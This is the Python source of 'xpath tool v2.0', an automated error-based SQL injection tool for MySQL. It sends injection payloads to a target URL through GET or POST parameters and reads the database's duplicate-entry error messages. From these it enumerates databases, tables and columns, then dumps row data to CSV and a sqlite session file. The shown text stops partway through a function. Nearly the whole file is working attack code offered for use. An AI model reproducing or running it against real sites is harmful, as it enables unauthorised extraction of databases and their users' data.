#!/usr/bin/python
#######################################################
#   xpath tool v2.0 - Automated Xpath Sql Injection   #
#       Author: Nasir khan (r0ot h3x49)               #
#######################################################
import os, re
from Payload.ErrorPayloads import *
from _compat import (
					compat_request,
					compat_urlerr,
					compat_urlopen,
					compat_httperr,
					compat_urlparse,
					compat_opener,
					compat_prettytable,
					compat_timer,
					compat_strftime,
					compat_sleep,
					compat_get,
					compat_post,
					user_agent_win,
					user_agent_unix,
					compat_color,
					compat_product,
					user_agent_default,
					compat_user,
					compat_exist,
					compat_session,
					compat_cursor,
					compat_writer,
					compat_timeout,
					)
sqlite = compat_session()
class ErrorBasedSQLi:
	def __init__(self, url, data=None, timeout=None):
		self._url         = url
		self._data        = data

		# Creating session making script to execute session
		self._session	  = False
		self._timeout 	  = timeout


		#  Files and directories to Create
		self._LFile       = 'log'
		self._dirXpath    = '.Xpath'
		self._dirOutput   = 'output'
		self._PFile       = 'target.txt'
		self._SFile		  = 'session.sqlite'
		self._target      = (compat_urlparse(self._url)).netloc

		# Global paths to the Session, logs, and payload file
		self._PathSession = ''
		self._PathLogs	  = ''
		self._PathPloads  = ''
		self._tgt 		  = ''
		self._PathDbdump  = ''
		self._dbdirectory = ''

		# Database Columns to alter the table
		# Table Name
		self.tblSession = "`tblSession`"
		
		# Column Name
		self.colPrm		= "`Param` TEXT"
		self.colTyp 	= "`Type` TEXT"
		self.colTit		= "`Title` TEXT"
		self.colPld		= "`Payload` TEXT"
		self.colCdb 	= "`Database` TEXT"
		self.colVer		= "`Version` TEXT"
		self.colUsr		= "`User` TEXT"
		self.colHst		= "`Host` TEXT"

		self.tblPayload = "`tblPayload`"

		self.colDbp		= "`PayloadDbs` TEXT"
		self.colTbp		= "`PayloadTbls` TEXT"
		self.colClp		= "`PayloadCols` TEXT"
		self.colDtp 	= "`PayloadDump` TEXT"
		self.colDbc		= "`DbsCount` TEXT"
		self.colDbs		= "`DbsNames` TEXT"

		# Logs to save:
		self._logs = ""
	def PathToSave(self):

		if os.name == 'posix':
			path    = compat_user("~")
			Xpath   = str(path) + "/" + str(self._dirXpath)
			Output  = str(Xpath) + "/" + str(self._dirOutput)
			target  = str(Output) + "/" + str(self._target)
			self._tgt = target
			log     = str(target) + "/" + str(self._LFile)
			plod    = str(target) + "/" + str(self._PFile)
			if compat_exist(path):
				try:
					os.makedirs(target)
				except Exception as e:
					pass
				if compat_exist(target):
					logs  = open(str(log), "a")
					plods = open(str(plod), "a")
					logs.close()
					plods.close()
					self._PathLogs = log
					self._PathPloads = plod
		else:
			path    = os.environ["USERPROFILE"]
			Xpath   = str(path) + "\\" + str(self._dirXpath)
			Output  = str(Xpath) + "\\" + str(self._dirOutput)
			target  = str(Output) + "\\" + str(self._target)
			self._tgt = target
			log     = str(target) + "\\" + str(self._LFile)
			plod    = str(target) + "\\" + str(self._PFile)
			if compat_exist(path):
				try:
					os.makedirs(target)
				except Exception as e:
					pass
				if compat_exist(target):
					logs  = open(str(log), "a")
					plods = open(str(plod), "a")
					logs.close()
					plods.close()
					self._PathLogs    = log
					self._PathPloads  = plod
	def XpathBasic(self, tgt, Table, Col, Name=None, Payloads=None):

		_colAlter     = Col
		_tableSession = Table
		Query_Test    = False
		if self._url and not self._data:

			for QueryIndex in Payloads:
				if not Query_Test:
					QueryToTest = ('%s' % QueryIndex)
					if '0x72306f74' in tgt:
						FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
						try:
							req = compat_request(FinalCountQuery_replaced, headers={'User-agent':user_agent_win if os.name is "win32" else user_agent_unix})
							resp = compat_urlopen(req, timeout=self._timeout)
						except Exception as e:
							pass
						else:
							respdata = resp.read()
							if "Duplicate entry '~" in respdata:
								Query_Test = True
								banner = respdata.split("Duplicate entry '~")[1].split("1' for key 'group_key'")[0]

								if not self._session:
									sqlite.SessionAlter(self._PathSession, _tableSession, Col=_colAlter)

								print compat_color.fg + compat_color.sb + "[" + compat_strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % (banner)
								print compat_color.fg + compat_color.sb + "back-end DBMS: MySQL >= 5.1"
								print compat_color.fg + compat_color.sb + "%s: '%s'" % (Name, banner)
								self._logs += "back-end DBMS: MySQL >= 5.1\n"
								self._logs += "%s: %s\n\n" % (Name, banner)

								_data = "'%s'" % (banner)
								sqlite.SessionUpdate(self._PathSession, _tableSession, Col=(_colAlter).replace(" TEXT",""), Data=_data)
								
				if Query_Test:
					# Writing the logs to logs file
					with open(str(self._PathLogs), "a") as f:
						f.write(str(self._logs))
					f.close()
					# cleaning logs
					self._logs = ""
					break

		elif self._url and self._data:

			for QueryIndex in Payloads:
				if not Query_Test:
					QueryToTest = ('%s' % QueryIndex)
					if '0x72306f74' in tgt:
						FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
						try:
							req = compat_request(self._url, data=FinalCountQuery_replaced, headers={'User-agent':user_agent_win if os.name is "win32" else user_agent_unix})
							resp = compat_urlopen(req, timeout=self._timeout)
						except Exception as e:
							pass
						else:
							respdata = resp.read()
							if "Duplicate entry '~" in respdata:
								Query_Test = True
								banner = respdata.split("Duplicate entry '~")[1].split("1' for key 'group_key'")[0]

								if not self._session:
									sqlite.SessionAlter(self._PathSession, _tableSession, Col=_colAlter)

								print compat_color.fg + compat_color.sb + "[" + compat_strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % (banner)
								print compat_color.fg + compat_color.sb + "back-end DBMS: MySQL >= 5.1"
								print compat_color.fg + compat_color.sb + "%s: '%s'" % (Name, banner)
								self._logs += "back-end DBMS: MySQL >= 5.1\n"
								self._logs += "%s: %s\n\n" % (Name, banner)

								_data = "'%s'" % (banner)
								sqlite.SessionUpdate(self._PathSession, _tableSession, Col=(_colAlter).replace(" TEXT",""), Data=_data)
								
				if Query_Test:
					# Writing the logs to logs file
					with open(str(self._PathLogs), "a") as f:
						f.write(str(self._logs))
					f.close()
					# cleaning logs
					self._logs = ""
					break
	def XpathDump(self, init, total, _payload):

		# list for saving dumps
		_dlist = []
		_dumped = total

		if self._url and not self._data:

			# Itering through the no of data
			for itr in range(init, total):

				# setting payload 
				if 'LIMIT/**_**/0' in _payload:
					_dbsQuery = _payload.replace('LIMIT/**_**/0','LIMIT/**_**/%d' % (itr))
				elif 'LIMIT%200' in _payload:
					_dbsQuery = _payload.replace('LIMIT%200','LIMIT%%20%d' % (itr))
				else:
					_dbsQuery = _payload.replace('LIMIT+0','LIMIT+%d' % (itr))

				try:
					req = compat_request(_dbsQuery, headers={'User-agent':user_agent_win if os.name is "win32" else user_agent_unix})
					resp = compat_urlopen(req, timeout=self._timeout)
				except Exception as e:
					pass
				except KeyboardInterrupt as e:
					_clean = ','.join(map(str, _dlist))
					return _clean, _payload, _dlist, _dumped
				else:
					respdata = resp.read()
					if "Duplicate entry '~" in respdata:
						_dbn     = respdata.split("Duplicate entry '~")[1].split("1' for key 'group_key'")[0]
						print compat_color.fg + compat_color.sb + "[" + compat_strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % (_dbn)
						_dlist.append(_dbn)

			_clean  = ','.join(map(str, _dlist))
			return _clean, _payload, _dlist, _dumped

		elif self._url and self._data:
			
			for itr in range(init, total):

				# setting payload 
				if 'LIMIT/**_**/0' in _payload:
					_dbsQuery = _payload.replace('LIMIT/**_**/0','LIMIT/**_**/%d' % (itr))
				elif 'LIMIT%200' in _payload:
					_dbsQuery = _payload.replace('LIMIT%200','LIMIT%%20%d' % (itr))
				else:
					_dbsQuery = _payload.replace('LIMIT+0','LIMIT+%d' % (itr))

				try:
					req = compat_request(self._url, data=_dbsQuery, headers={'User-agent':user_agent_win if os.name is "win32" else user_agent_unix})
					resp = compat_urlopen(req, timeout=self._timeout)
				except Exception as e:
					pass
				except KeyboardInterrupt as e:
					_clean = ','.join(map(str, _dlist))
					return _clean, _payload, _dlist, _dumped
				else:
					respdata = resp.read()
					if "Duplicate entry '~" in respdata:
						_dbn     = respdata.split("Duplicate entry '~")[1].split("1' for key 'group_key'")[0]
						print compat_color.fg + compat_color.sb + "[" + compat_strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % (_dbn)
						_dlist.append(_dbn)

			_clean  = ','.join(map(str, _dlist))
			return _clean, _payload, _dlist, _dumped
	def XpathDataDump(self, init, total, _payload, Table=None, Dbname=None, Coltodump=None, flag=True):

		# list for saving dumps
		_info = ""
		_innerCounter = 0
		_colTabulate = [w.replace("`","") for w in Coltodump]
		_tabulate = compat_prettytable(_colTabulate)
		_tabulate.align = "l"
		_tabulate.header = True
		cols = " TEXT,".join(map(str, Coltodump))
		ColsToCreate = "%s TEXT" % (cols)
		ok = re.compile(r'[^\\/:*?"<>|("")$#!%]')
		_db   = Dbname

		if compat_exist(self._tgt):
			_directory 			= 	"%s" % (_db)
			_db_directory		=	"%s/%s" % (self._tgt, _directory) if os.name is "posix" else "%s\\%s" % (self._tgt, _directory)
			self._dbdirectory 	= "%s" % (_db_directory)
			try:
				os.makedirs(_db_directory)
			except Exception as e:
				pass
		
		if compat_exist(self._dbdirectory):
			_tbl_dump	= "%s/%s" % (self._dbdirectory, Table.replace("`","")) if os.name is "posix" else "%s\\%s" % (self._dbdirectory, Table.replace("`",""))
			try:
				_csv_file 	= open("%s.csv" % (_tbl_dump), "ab")
			except (Exception, IOError) as e:
				if "Permission denied" in e:
					print '\n' + compat_color.fr + compat_color.sb + "[" + compat_strftime("%H:%M:%S")+"] [ERROR] Cannot write to '%s.csv' the file is already open please close it.." % (Table)
				print compat_color.fw + compat_color.sn + "\n[*] shutting down at "+compat_strftime("%H:%M:%S")+"\n"	
				exit(0)
			else:
				_writer		= compat_writer(_csv_file, dialect='excel')

		if Table and flag:
			sqlite.SessionCreate(self._PathSession, Table, Cols=ColsToCreate)

		if self._url and not self._data:

			# Itering through the no of data
			for itr in range(init, total):

				for col in Coltodump:
					# setting payload 
					if 'LIMIT/**_**/0' in _payload:
						_dbsQuery = _payload.replace('LIMIT/**_**/0','LIMIT/**_**/%d' % (itr))
					elif 'LIMIT%200' in _payload:
						_dbsQuery = _payload.replace('LIMIT%200','LIMIT%%20%d' % (itr))
					else:
						_dbsQuery = _payload.replace('LIMIT+0','LIMIT+%d' % (itr))

					FinalCountQuery_replaced = _dbsQuery.replace("0x72306f74", "%s" % (col))

					try:
						req = compat_request(FinalCountQuery_replaced, headers={'User-agent':user_agent_win if os.name is "win32" else user_agent_unix})
						resp = compat_urlopen(req, timeout=self._timeout)
					except Exception as e:
						_csv_file.close()
						_dlist 	= str(_tabulate)
						return _dlist, _payload
					except KeyboardInterrupt as e:
						_csv_file.close()
						_dlist 	= str(_tabulate)
						return _dlist, _payload
					else:
						respdata = resp.read()
						if "Duplicate entry '~" in respdata:
							_dbn     = respdata.split("Duplicate entry '~")[1].split("1' for key 'group_key'")[0]
							print compat_color.fg + compat_color.sb + "[" + compat_strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % (_dbn)
							_innerCounter += 1
							if _dbn is not None:
								_info += "%s," % (_dbn.strip().replace(",", "-") if "," in _dbn else _dbn)
						if _innerCounter == len(Coltodump):
							try:
								_toSplit = "".join(x if ok.match(x) else "_" for x in _info)
								_dumped = _toSplit[:-1].split(",")
								_writer.writerow(_dumped)
								_info = ""
								_dt = ",".join(map(str, _dumped))
								_data = '"%s"' % (_dt.replace(",", '","'))
								sqlite.SessionInsert(self._PathSession, Table, Cols=(ColsToCreate).replace(" TEXT", ""), Data=_data)
								_tabulate.add_row(_dumped)
								_innerCounter = 0
							except KeyboardInterrupt as e:
								_csv_file.close()
								_dlist 	= str(_tabulate)
								return _dlist, _payload

			_dlist 	= str(_tabulate)
			_csv_file.close()
			return _dlist, _payload

		elif self._url and self._data:
			
			# Itering through the no of data
			for itr in range(init, total):

				for col in Coltodump:
					# setting payload 
					if 'LIMIT/**_**/0' in _payload:
						_dbsQuery = _payload.replace('LIMIT/**_**/0','LIMIT/**_**/%d' % (itr))
					elif 'LIMIT%200' in _payload:
						_dbsQuery = _payload.replace('LIMIT%200','LIMIT%%20%d' % (itr))
					else:
						_dbsQuery = _payload.replace('LIMIT+0','LIMIT+%d' % (itr))

					FinalCountQuery_replaced = _dbsQuery.replace("0x72306f74", "%s" % (col))

					try:
						req = compat_request(self._url, data=FinalCountQuery_replaced, headers={'User-agent':user_agent_win if os.name is "win32" else user_agent_unix})
						resp = compat_urlopen(req, timeout=self._timeout)
					except Exception as e:
						_dlist 	= str(_tabulate)
						return _dlist, _payload
					except KeyboardInterrupt as e:
						_dlist 	= str(_tabulate)
						_csv_file.close()
						return _dlist, _payload
					else:
						respdata = resp.read()
						if "Duplicate entry '~" in respdata:
							_dbn     = respdata.split("Duplicate entry '~")[1].split("1' for key 'group_key'")[0]
							print compat_color.fg + compat_color.sb + "[" + compat_strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % (_dbn)
							_innerCounter += 1
							if _dbn is not None:
								_info += "%s," % (_dbn.strip().replace(",", "-") if "," in _dbn else _dbn)
						if _innerCounter == len(Coltodump):
							try:
								_toSplit = "".join(x if ok.match(x) else "_" for x in _info)
								_dumped = _toSplit[:-1].split(",")
								_writer.writerow(_dumped)
								_info = ""
								_dt = ",".join(map(str, _dumped))
								_data = '"%s"' % (_dt.replace(",", '","'))
								sqlite.SessionInsert(self._PathSession, Table, Cols=(ColsToCreate).replace(" TEXT", ""), Data=_data)
								_tabulate.add_row(_dumped)
								_innerCounter = 0
							except KeyboardInterrupt as e:
								_dlist 	= str(_tabulate)
								_csv_file.close()
								return _dlist, _payload

			_dlist 	= str(_tabulate)
			_csv_file.close()
			return _dlist, _payload
	def XpathAdvance(self, flag ,tgt, Col, Name=None, Payloads=None, total=None, Dbname=None, TblName=None, ColsList=None):

		_tablePayload  = self.tblPayload
		_colUpdate     = Col[0]

		_tableSession  = self.tblSession
		_colAlterCount = Col[1]
		_colAlterName  = Col[2]

		PayloadCount   = Payloads[0]
		PayloadDump	   = Payloads[1]

		Query_Test    = flag

		if Name:
			print compat_color.fg + compat_color.sn + "["+compat_strftime("%H:%M:%S")+"] [INFO] fetching %s" % (Name)

		if self._url and not self._data:

			for QueryIndex, inline_comment in compat_product(PayloadCount, (False, True)):
				if not Query_Test:
					QueryToTest = ('%s' % QueryIndex).replace(" " if inline_comment else "/**/","/**/")
					if '0x72306f74' in tgt:

						if Dbname and not TblName and not ColsList:
							FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest % (Dbname.encode("hex", "strict")))
						elif Dbname and TblName and not ColsList:
							FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest % (Dbname.encode("hex", "strict"), TblName.encode("hex", "strict")))
						elif Dbname and TblName and ColsList:
							FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest % (Dbname, TblName))
						else:
							FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest)

						try:
							req  = compat_request(FinalCountQuery_replaced, headers={'User-agent':user_agent_win if os.name is "win32" else user_agent_unix})
							resp = compat_urlopen(req, timeout=self._timeout)
						except Exception as e:
							pass
						else:
							respdata = resp.read()
							if "Duplicate entry '~" in respdata:
								Query_Test = True
								Count = respdata.split("Duplicate entry '~")[1].split("1' for key 'group_key'")[0]
								if not self._session and int(Count) != 0:
									sqlite.SessionAlter(self._PathSession, _tableSession, Col=_colAlterCount)
									print compat_color.fg + compat_color.sd + "[" + compat_strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % (Count)
								else:
									print compat_color.fr + compat_color.sb + "[" + compat_strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % (Count)
									print compat_color.fw + compat_color.sn + "\n[*] shutting down at "+compat_strftime("%H:%M:%S")+"\n"
									exit(0)
								
								_data = "'%s'" % (Count)
								sqlite.SessionUpdate(self._PathSession, _tableSession, Col=(_colAlterCount).replace(" TEXT",""), Data=_data)

				if Query_Test:
					DQuery = False
					for QueryIndex, inline_comment in compat_product(PayloadDump, (False, True)):
						if not DQuery:
							QueryToTest = ('%s' % QueryIndex).replace(" " if inline_comment else "/**/","/**/")
							if '0x72306f74' in tgt:

								if Dbname and not TblName and not ColsList:
									FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest % (Dbname.encode("hex", "strict")))
								elif Dbname and TblName and not ColsList:
									FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest % (Dbname.encode("hex", "strict"), TblName.encode("hex", "strict")))
								elif Dbname and TblName and ColsList:	
									FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest % (ColsList[0], Dbname, TblName))
								else:
									FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest)

								try:
									req  = compat_request(FinalCountQuery_replaced, headers={'User-agent':user_agent_win if os.name is "win32" else user_agent_unix})
									resp = compat_urlopen(req, timeout=self._timeout)
								except Exception as e:
									 pass
								else:
									respdata = resp.read()
									if "Duplicate entry '~" in respdata:
										dbsName  = respdata.split("Duplicate entry '~")[1].split("1' for key 'group_key'")[0]
										DQuery = True
										if not self._session:
											sqlite.SessionAlter(self._PathSession, _tableSession, Col=_colAlterName)
						if DQuery:
							_init    = 0
							_total   = int(Count) if not flag else int(total)
							_payload = FinalCountQuery_replaced
							if ColsList:
								_pl 	= _payload.replace(ColsList[0], "0x72306f74")
								__dlist, __ = self.XpathDataDump(_init, _total, _pl, Table=TblName, Dbname=Dbname,Coltodump=ColsList)
								_dlist = "%s" % (__dlist)
								_datapayload = '"%s"' % (_pl)
								sqlite.SessionUpdate(self._PathSession, _tablePayload, Col=(_colUpdate).replace(" TEXT",""), Data=_datapayload)
								return _dlist
							else:
								__names, _pl, __dlist, __dumped = self.XpathDump(_init, _total, _payload)
								_data = '"%s"' % (__names)
								_datapayload = '"%s"' % (_pl)
								sqlite.SessionUpdate(self._PathSession, _tableSession, Col=(_colAlterName).replace(" TEXT",""), Data=_data)
								sqlite.SessionUpdate(self._PathSession, _tablePayload, Col=(_colUpdate).replace(" TEXT",""), Data=_datapayload)
								return __dlist, __dumped
					break


		elif self._url and self._data:

			for QueryIndex, inline_comment in compat_product(PayloadCount, (False, True)):
				if not Query_Test:
					QueryToTest = ('%s' % QueryIndex).replace(" " if inline_comment else "/**/","/**/")
					if '0x72306f74' in tgt:

						if Dbname and not TblName and not ColsList:
							FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest % (Dbname.encode("hex", "strict")))
						elif Dbname and TblName and not ColsList:
							FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest % (Dbname.encode("hex", "strict"), TblName.encode("hex", "strict")))
						elif Dbname and TblName and ColsList:
							FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest % (Dbname, TblName))
						else:
							FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest)

						try:
							req  = compat_request(self._url, data=FinalCountQuery_replaced, headers={'User-agent':user_agent_win if os.name is "win32" else user_agent_unix})
							resp = compat_urlopen(req, timeout=self._timeout)
						except Exception as e:
							pass
						else:
							respdata = resp.read()
							if "Duplicate entry '~" in respdata:
								Query_Test = True
								Count = respdata.split("Duplicate entry '~")[1].split("1' for key 'group_key'")[0]
								if not self._session and int(Count) != 0:
									sqlite.SessionAlter(self._PathSession, _tableSession, Col=_colAlterCount)
									print compat_color.fg + compat_color.sd + "[" + compat_strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % (Count)
								else:
									print compat_color.fr + compat_color.sb + "[" + compat_strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % (Count)
									print compat_color.fw + compat_color.sn + "\n[*] shutting down at "+compat_strftime("%H:%M:%S")+"\n"
									exit(0)
								
								_data = "'%s'" % (Count)
								sqlite.SessionUpdate(self._PathSession, _tableSession, Col=(_colAlterCount).replace(" TEXT",""), Data=_data)

				if Query_Test:
					DQuery = False
					for QueryIndex, inline_comment in compat_product(PayloadDump, (False, True)):
						if not DQuery:
							QueryToTest = ('%s' % QueryIndex).replace(" " if inline_comment else "/**/","/**/")
							if '0x72306f74' in tgt:

								if Dbname and not TblName and not ColsList:
									FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest % (Dbname.encode("hex", "strict")))
								elif Dbname and TblName and not ColsList:
									FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest % (Dbname.encode("hex", "strict"), TblName.encode("hex", "strict")))
								elif Dbname and TblName and ColsList:
									FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest % (ColsList[0], Dbname, TblName))
								else:
									FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest)

								try:
									req  = compat_request(self._url, data=FinalCountQuery_replaced, headers={'User-agent':user_agent_win if os.name is "win32" else user_agent_unix})
									resp = compat_urlopen(req, timeout=self._timeout)
								except Exception as e:
									 pass
								else:
									respdata = resp.read()
									if "Duplicate entry '~" in respdata:
										dbsName  = respdata.split("Duplicate entry '~")[1].split("1' for key 'group_key'")[0]
										DQuery = True
										if not self._session:
											sqlite.SessionAlter(self._PathSession, _tableSession, Col=_colAlterName)
						if DQuery:
							_init    = 0
							_total   = int(Count) if not flag else int(total)
							_payload = FinalCountQuery_replaced
							if ColsList:
								_pl 	= _payload.replace(ColsList[0], "0x72306f74")
								__dlist, __ = self.XpathDataDump(_init, _total, _pl, Table=TblName, Dbname=Dbname,Coltodump=ColsList)
								_dlist = "%s" % (__dlist)
								_datapayload = '"%s"' % (_pl)
								sqlite.SessionUpdate(self._PathSession, _tablePayload, Col=(_colUpdate).replace(" TEXT",""), Data=_datapayload)
								return _dlist
							else:
								__names, _pl, __dlist, __dumped = self.XpathDump(_init, _total, _payload)
								_data = '"%s"' % (__names)
								_datapayload = '"%s"' % (_pl)
								sqlite.SessionUpdate(self._PathSession, _tableSession, Col=(_colAlterName).replace(" TEXT",""), Data=_data)
								sqlite.SessionUpdate(self._PathSession, _tablePayload, Col=(_colUpdate).replace(" TEXT",""), Data=_datapayload)
								return __dlist, __dumped
							break
					break
	def XpathInject(self, flag, Col, Name=None, Payloads=None, TblName=None, Dbname=None, ColList=None):

		# Couter for HTTP Requests
		HTTPReqCount = 0
		_name = Name

		# Table Session
		_tableSession = self.tblSession
		_colsSession  = "%s, %s, %s, %s" % (self.colPrm, self.colTyp, self.colTit, self.colPld)

		# Column to alter the Table Session
		_colAlter   = Col


		# Table Payload
		_tablePayload = self.tblPayload  
		_colsPayload = "%s,%s,%s,%s" % (self.colDbp, self.colTbp, self.colClp, self.colDtp)

		# Get Data Injection
		if self._url and not self._data:

			vul = False
			for prefix, query, sufix, inline_comment in compat_product(PREFIXES, TESTS, SUFIXES, (False, True)):
				try:

					if not vul:
						temp = ("%s%s%s" % (prefix, query, sufix)).replace(" " if inline_comment else "/**/","/**/")
						if '*' in self._url:
							first, last = self._url.split('*')
							tgt = first + temp + last
						else:
							tgt = self._url + temp

						try:
							print compat_color.fg + compat_color.sn + "["+compat_strftime("%H:%M:%S")+"] [INFO] testing '" + compat_color.fg + compat_color.sn + TITLE + compat_color.fg + compat_color.sn + "'"
							req = compat_request(tgt, headers={'User-agent': user_agent_win if os.name is "win32" else user_agent_unix})
							HTTPReqCount += 1
							resp = compat_urlopen(req, timeout=self._timeout)
						except compat_urlerr as e:
							pass
						except compat_httperr as e:
							pass
						except Exception as e:
							pass
						except KeyboardInterrupt:
							print '\n' + compat_color.fr + compat_color.sn + '['+compat_strftime("%H:%M:%S")+'] [ERROR] user aborted'
							print compat_color.fw + compat_color.sn + "\n[*] shutting down at "+compat_strftime("%H:%M:%S")+"\n"
							exit(0)
						else:
							respdata = resp.read()
							if "Duplicate entry '~" in respdata:
								vul = True
								retVal = respdata.split("Duplicate entry '~")[1].split("1' for key 'group_key'")[0]

								#  Creating Tables
								if not self._session:
									sqlite.SessionCreate(self._PathSession, _tableSession, Cols=_colsSession)
									sqlite.SessionCreate(self._PathSession, _tablePayload, Cols=_colsPayload)


								print compat_color.fg + compat_color.sb + 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:' % HTTPReqCount
								self._logs += 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:\n' % HTTPReqCount
								print compat_color.fw + compat_color.sn + '---'
								self._logs += '---\n'
								print compat_color.fw + compat_color.sn + 'Parameter: (GET)'
								self._logs += 'Parameter: (GET)\n'
								print compat_color.fw + compat_color.sn + '\tType: error-based'
								self._logs += '\tType: error-based\n'
								print compat_color.fw + compat_color.sn + '\tTitle: %s' % TITLE
								self._logs += '\tTitle: %s\n' % TITLE
								print compat_color.fw + compat_color.sn + '\tPayload: %s' % tgt
								self._logs += '\tPayload: %s\n' % tgt
								print compat_color.fw + compat_color.sn + '---'
								self._logs += '---\n'

								# Initial Injection data insertion into the Tables
								_data = '"GET", "error-based", "%s", "%s"' % (TITLE, tgt)
								sqlite.SessionInsert(self._PathSession, _tableSession, Cols=(_colsSession).replace(" TEXT",""), Data=_data)
								sqlite.SessionInsert(self._PathSession, _tablePayload, Cols=(_colsPayload).replace(" TEXT",""), Data=_data)
								# web app response and web server response headers
								war, wsr = resp.headers.get('X-Powered-By') , resp.headers.get('Server')

								print compat_color.fw + compat_color.sd + "["+compat_strftime("%H:%M:%S")+"] [INFO] the back-end DBMS is MySQL"
								self._logs += "the back-end DBMS is MySQL\n"

								if war and wsr:
									print compat_color.fw + compat_color.sd + "["+compat_strftime("%H:%M:%S")+"] [INFO] web application technology: %s, %s" % (war, wsr[0:14] if 'Apache' in wsr else wsr)
									self._logs += "web application technology: %s, %s\n" % (war, wsr[0:14] if 'Apache' in wsr else wsr)
								else:
									print compat_color.fw + compat_color.sd + "["+compat_strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % (wsr)
									self._logs += "web server technology: %s\n" % (wsr)
								print compat_color.fg + compat_color.sd + "["+compat_strftime("%H:%M:%S")+"] [INFO] fetching %s" % (_name)

								
					if vul:
						# writing into the target.txt file (target, injection type)
						w = "%s (%s)" % (self._url, "GET")
						with open(str(self._PathPloads), "w") as fw:
							fw.write(str(w))
						fw.close()
						# flag check for basic or advance extraction 
						if flag == 'basic':
							#  extracts basics (version, database, user, host)
							self.XpathBasic(tgt, _tableSession, _colAlter, _name, Payloads)

						else:
							# extracts (dbs, tables, columns, dumps data from columns)
							_flag = False
							if Dbname and not TblName and not ColList:
								__dlist, __dumped = self.XpathAdvance(_flag, tgt, _colAlter, Payloads=Payloads, Dbname=Dbname)
							elif Dbname and TblName and not ColList:
								__dlist, __dumped = self.XpathAdvance(_flag, tgt, _colAlter, Payloads=Payloads, Dbname=Dbname, TblName=TblName)
							elif Dbname and TblName and ColList:
								__dlist = self.XpathAdvance(_flag, tgt, _colAlter, Payloads=Payloads, Dbname=Dbname, TblName=TblName, ColsList=ColList)
								_dlist = "%s" % (__dlist)
								return _dlist
							else:
								__dlist, __dumped = self.XpathAdvance(_flag, tgt, _colAlter, Payloads=Payloads)
						return __dlist, __dumped
						# print "breaking now"
						break

				except Exception as e:
					if not vul:
						continue
					else:
						break

		elif self._url and self._data:

			vul = False
			for prefix, query, sufix, inline_comment in compat_product(PREFIXES, TESTS, SUFIXES, (False, True)):
				try:

					if not vul:
						temp = ("%s%s%s" % (prefix, query, sufix)).replace(" " if inline_comment else "/**/","/**/")
						if '*' in self._data:
							first, last = self._data.split('*')
							tgt = first + temp + last
						else:
							tgt = self._data + temp

						try:
							print compat_color.fg + compat_color.sn + "["+compat_strftime("%H:%M:%S")+"] [INFO] testing '" + compat_color.fg + compat_color.sn + TITLE + compat_color.fg + compat_color.sn + "'"
							req = compat_request(self._url, data=tgt, headers={'User-agent': user_agent_win if os.name is "win32" else user_agent_unix})
							HTTPReqCount += 1
							resp = compat_urlopen(req, timeout=self._timeout)
						except compat_urlerr as e:
							pass
						except compat_httperr as e:
							pass
						except Exception as e:
							pass
						except KeyboardInterrupt:
							print '\n' + compat_color.fr + compat_color.sn + '['+compat_strftime("%H:%M:%S")+'] [ERROR] user aborted'
							print compat_color.fw + compat_color.sn + "\n[*] shutting down at "+compat_strftime("%H:%M:%S")+"\n"
							exit(0)
						else:
							respdata = resp.read()
							if "Duplicate entry '~" in respdata:
								vul = True
								retVal = respdata.split("Duplicate entry '~")[1].split("1' for key 'group_key'")[0]

								#  Creating Tables
								if not self._session:
									sqlite.SessionCreate(self._PathSession, _tableSession, Cols=_colsSession)
									sqlite.SessionCreate(self._PathSession, _tablePayload, Cols=_colsPayload)


								print compat_color.fg + compat_color.sb + 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:' % HTTPReqCount
								self._logs += 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:\n' % HTTPReqCount
								print compat_color.fw + compat_color.sn + '---'
								self._logs += '---\n'
								print compat_color.fw + compat_color.sn + 'Parameter: (POST)'
								self._logs += 'Parameter: (POST)\n'
								print compat_color.fw + compat_color.sn + '\tType: error-based'
								self._logs += '\tType: error-based\n'
								print compat_color.fw + compat_color.sn + '\tTitle: %s' % TITLE
								self._logs += '\tTitle: %s\n' % TITLE
								print compat_color.fw + compat_color.sn + '\tPayload: %s' % tgt
								self._logs += '\tPayload: %s\n' % tgt
								print compat_color.fw + compat_color.sn + '---'
								self._logs += '---\n'

								# Initial Injection data insertion into the Tables
								_data = '"POST", "error-based", "%s", "%s"' % (TITLE, tgt)
								sqlite.SessionInsert(self._PathSession, _tableSession, Cols=(_colsSession).replace(" TEXT",""), Data=_data)
								sqlite.SessionInsert(self._PathSession, _tablePayload, Cols=(_colsPayload).replace(" TEXT",""), Data=_data)
								# web app response and web server response headers
								war, wsr = resp.headers.get('X-Powered-By') , resp.headers.get('Server')

								print compat_color.fw + compat_color.sd + "["+compat_strftime("%H:%M:%S")+"] [INFO] the back-end DBMS is MySQL"
								self._logs += "the back-end DBMS is MySQL\n"

								if war and wsr:
